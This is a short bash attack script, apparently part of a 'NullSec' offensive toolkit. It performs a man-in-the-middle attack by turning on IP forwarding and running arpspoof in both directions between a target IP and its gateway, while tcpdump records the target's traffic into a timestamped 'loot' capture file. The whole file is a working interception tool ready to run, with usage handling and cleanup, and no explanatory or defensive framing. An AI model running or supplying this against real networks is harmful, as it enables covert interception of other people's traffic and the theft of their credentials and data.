#!/bin/bash
# NullSec MITM Attack
# ARP spoofing with traffic capture

LOOT_DIR="/root/loot/mitm"
TARGET="${1:-}"
GATEWAY="${2:-}"
IFACE="${3:-eth0}"

if [[ -z "$TARGET" ]] || [[ -z "$GATEWAY" ]]; then
    echo "Usage: $0 <target_ip> <gateway_ip> [interface]"
    exit 1
fi

mkdir -p "$LOOT_DIR"
PCAP="$LOOT_DIR/mitm_$(date +%Y%m%d_%H%M%S).pcap"

echo "[*] NullSec MITM Attack"
echo "[*] Target: $TARGET"
echo "[*] Gateway: $GATEWAY"
echo "[*] Interface: $IFACE"

# Enable forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward

# Start capture
tcpdump -i $IFACE -w "$PCAP" host $TARGET &
TCPDUMP_PID=$!

# ARP spoof (both directions)
arpspoof -i $IFACE -t $TARGET $GATEWAY &
ARP1_PID=$!
arpspoof -i $IFACE -t $GATEWAY $TARGET &
ARP2_PID=$!

echo "[+] MITM active"
echo "[*] Capturing to: $PCAP"
echo "[*] Press Ctrl+C to stop"

cleanup() {
    kill $TCPDUMP_PID $ARP1_PID $ARP2_PID 2>/dev/null
    echo 0 > /proc/sys/net/ipv4/ip_forward
    echo "[+] Cleanup complete"
}

trap cleanup EXIT
wait
